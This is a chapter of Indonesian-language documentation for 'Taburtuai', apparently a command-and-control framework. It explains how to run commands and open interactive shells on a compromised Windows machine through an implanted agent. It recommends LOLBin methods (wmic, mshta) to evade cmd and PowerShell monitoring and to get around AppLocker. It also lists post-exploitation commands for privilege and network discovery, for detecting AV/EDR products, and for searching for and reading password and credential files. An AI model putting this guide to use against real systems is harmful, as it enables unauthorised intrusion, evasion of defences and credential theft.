# 05 — Command Execution

## Metode Eksekusi

Taburtuai mendukung empat cara eksekusi shell command di target Windows. Metode ini
di-bake ke agent saat build dan bisa dioverride per-command.

| Method | Binary yang Dipanggil | LOLBin | Cocok untuk |
|---|---|---|---|
| `cmd` | `cmd.exe /C` | Tidak | Default, kompatibel luas |
| `powershell` | `powershell.exe -EncodedCommand` | Tidak | Output rich, cmdlets PowerShell |
| `wmi` | `wmic.exe process call create` | Ya | Parent proses = svchost.exe |
| `mshta` | `mshta.exe javascript:...` | Ya | Bypass monitoring cmd/ps |

---

## Single Command — `cmd`

### Syntax

```
cmd <agent-id> "<perintah>"
```

### Contoh Dasar

```
taburtuai(IP:PORT) › cmd 2703886d "whoami"
[+] DESKTOP-QLPBF95\windows

taburtuai(IP:PORT) › cmd 2703886d "hostname"
[+] DESKTOP-QLPBF95

taburtuai(IP:PORT) › cmd 2703886d "ipconfig /all"
[+]
Windows IP Configuration

   Host Name . . . . . . . . . : DESKTOP-QLPBF95
   Primary Dns Suffix  . . . . :
   ...
```

### Perintah dengan Spasi dan Karakter Khusus

Gunakan tanda kutip ganda untuk membungkus perintah:

```
taburtuai(IP:PORT) › cmd 2703886d "dir C:\Users\windows\Desktop"
taburtuai(IP:PORT) › cmd 2703886d "net user administrator"
taburtuai(IP:PORT) › cmd 2703886d "systeminfo | findstr /i os"
taburtuai(IP:PORT) › cmd 2703886d "wmic computersystem get username"
```

### Dengan Timeout

```
taburtuai(IP:PORT) › cmd 2703886d "ping -n 10 8.8.8.8" --timeout 30
```

### Tanpa Menunggu Hasil (`--no-wait`)

```
taburtuai(IP:PORT) › cmd 2703886d "start notepad.exe" --no-wait
[+] Command queued: a1b2c3d4-...
[*] Use 'status a1b2c3d4-...' to check result later.
```

---

## Interactive Shell — `shell`

Buka sesi shell interaktif dengan agent. Kamu bisa mengetik perintah seperti di terminal
biasa, tanpa harus terus mengetik `cmd <id>` setiap saat.

### Buka Shell

```
taburtuai(IP:PORT) › shell 2703886d
```

```
[*] Opening interactive shell with 2703886d (DESKTOP-QLPBF95\windows)
[*] Type 'exit' or 'quit' to end session. Ctrl+C to interrupt.

[shell 2703886d DESKTOP-QLPBF95\windows] >
```

### Contoh Sesi Shell

```
[shell 2703886d DESKTOP-QLPBF95\windows] > whoami
DESKTOP-QLPBF95\windows

[shell 2703886d DESKTOP-QLPBF95\windows] > net user
User accounts for \\DESKTOP-QLPBF95
-------------------------------------------------------------------------------
Administrator   DefaultAccount  Guest   windows   WDAGUtilityAccount
The command completed successfully.

[shell 2703886d DESKTOP-QLPBF95\windows] > net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access...
Members
-------------------------------------------------------------------------------
Administrator
The command completed successfully.

[shell 2703886d DESKTOP-QLPBF95\windows] > dir C:\Users
 Volume in drive C is Windows
 Volume Serial Number is A1B2-C3D4

 Directory of C:\Users
04/23/2026  04:30 PM    <DIR>          .
04/23/2026  04:30 PM    <DIR>          ..
04/23/2026  02:15 PM    <DIR>          Administrator
04/23/2026  02:15 PM    <DIR>          Public
04/23/2026  02:30 PM    <DIR>          windows

[shell 2703886d DESKTOP-QLPBF95\windows] > exit
[*] Shell session ended.
```

### Opsi Shell

```
taburtuai(IP:PORT) › shell 2703886d --timeout 300
# Timeout 5 menit per perintah (default: 60s)
```

---

## Perintah Enumerasi Umum

Berikut kumpulan perintah yang berguna untuk fase post-exploitation awal:

### Identitas dan Privilege

```
[shell] > whoami
[shell] > whoami /all                         # privilege lengkap
[shell] > whoami /groups                      # group membership
[shell] > net user %username% /domain         # info user di domain
[shell] > query user                          # siapa saja yang login
```

### System Information

```
[shell] > systeminfo
[shell] > systeminfo | findstr /i "os domain"
[shell] > wmic os get caption,version,buildnumber
[shell] > wmic computersystem get name,domain,manufacturer,model
[shell] > hostname
[shell] > echo %COMPUTERNAME%
[shell] > echo %USERDOMAIN%
```

### Jaringan

```
[shell] > ipconfig /all
[shell] > netstat -ano                        # koneksi aktif
[shell] > netstat -ano | findstr ESTABLISHED  # koneksi established saja
[shell] > arp -a                              # ARP table
[shell] > route print                         # routing table
[shell] > net view /all                       # lihat mesin di network
[shell] > net view /domain                    # lihat domain
```

### Users dan Groups

```
[shell] > net user                            # local users
[shell] > net localgroup                      # local groups
[shell] > net localgroup administrators       # anggota admin
[shell] > net user administrator              # detail administrator
[shell] > wmic useraccount list brief
```

### Proses dan Service

```
[shell] > tasklist
[shell] > tasklist /v                         # dengan detail
[shell] > tasklist /svc                       # dengan service
[shell] > net start                           # service yang berjalan
[shell] > sc query                            # status semua service
```

### Installed Software

```
[shell] > wmic product get name,version
[shell] > reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall /s
```

### Security Products (AV/EDR Detection)

```
[shell] > wmic /namespace:\\root\securitycenter2 path antivirusproduct get displayName
[shell] > sc query windefend                  # Windows Defender status
[shell] > tasklist | findstr -i "defender endpoint crowdstrike sentinel cylance"
```

### File System

```
[shell] > dir C:\Users\windows\Desktop
[shell] > dir C:\Users\windows\Documents
[shell] > dir C:\Users\windows\Downloads
[shell] > dir "C:\Program Files"
[shell] > dir C:\ /s /b | findstr /i "password credential config"
[shell] > type C:\Users\windows\Desktop\passwords.txt
```

---

## Memahami Exit Code

Setiap perintah punya exit code:
- **0** → sukses
- **Non-zero** → gagal / error

```
taburtuai(IP:PORT) › status <cmd-id>

    Exit Code  : 0       ← sukses
    Exit Code  : 1       ← error umum
    Exit Code  : -1      ← timeout / agent tidak eksekusi
```

---

## Exec Method di Shell

Secara default, `shell` dan `cmd` menggunakan exec method yang di-bake saat build agent
(biasanya `powershell` untuk stealth build). Kamu tidak perlu mengubahnya kecuali ada
kebutuhan spesifik.

**Kapan pakai `cmd` method:**
- Target block PowerShell via AppLocker/GPO
- Perintah sederhana yang tidak butuh cmdlet PowerShell
- Kompatibilitas maksimal dengan Windows lama

**Kapan pakai `powershell` method (default):**
- Perintah yang pakai pipeline (`|`)
- Butuh .NET framework
- Output rich (tabel, format, dll)

**Kapan pakai `wmi` method:**
- Butuh proses parent = svchost.exe (lebih stealth)
- Target ada monitoring cmd.exe dan powershell.exe

**Kapan pakai `mshta` method:**
- Kedua cmd.exe dan powershell.exe diblokir
- Butuh LOLBin execution

---

**Selanjutnya:** [06 — File Operations](06-files.md)
